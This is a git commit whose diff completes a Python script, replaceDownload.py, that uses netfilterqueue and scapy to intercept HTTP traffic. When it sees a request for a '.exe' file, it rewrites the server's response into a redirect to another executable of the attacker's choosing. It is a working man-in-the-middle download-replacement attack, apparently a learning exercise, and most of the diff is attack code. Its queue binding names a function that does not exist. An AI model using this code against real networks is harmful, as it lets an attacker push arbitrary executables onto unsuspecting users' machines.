518c6f7b741ad03a2757530d0457b6550d88eecb
Tony Nguyen <69164218+Tnguye98@users.noreply.github.com>
2022-07-28 15:45:27 -0400

    Update replaceDownload.py
    Completed and able to run on python3. Replaces the .exe downloadable file to whatever I wanted to download.

--- Python/replaceDownload.py
+++ Python/replaceDownload.py
@@ -2,18 +2,32 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ackList = []
+
+def setLoad(packet, load):
+	packet[scapy.Raw].load = load
+	del packet[scapy.IP].len
+	del packet[scapy.IP].chksum
+	# del scapyPacket[scapy.TCP].len
+	del packet[scapy.TCP].chksum
+	return packet
 
 def processPacket(packet):
 	scapyPacket = scapy.IP(packet.get_payload())
 	if scapyPacket.haslayer(scapy.Raw):
 		if scapyPacket[scapy.TCP].dport == 80:
-			print("HTTP Request")
-			print(scapyPacket.show())
-		elif scapyPacket[scapy.TCP].sport == 80:
-			print("HTTP Response")
-			print(scapyPacket.show())
+			if ".exe" in scapyPacket[scapy.Raw].load.decode():
+				print("[+] exe Request")
+				ackList.append(scapyPacket[scapy.TCP].ack)
 
+		elif scapyPacket[scapy.TCP].sport == 80:
+			if scapyPacket[scapy.TCP].seq in ackList:
+				print("[+] Replacing file")
+				ackList.remove(scapyPacket[scapy.TCP].seq)
+				modifiedPacket = setLoad(scapyPacket, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-611.exe\n\n")
+				packet.set_payload(bytes(modifiedPacket))
 	packet.accept()
+
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
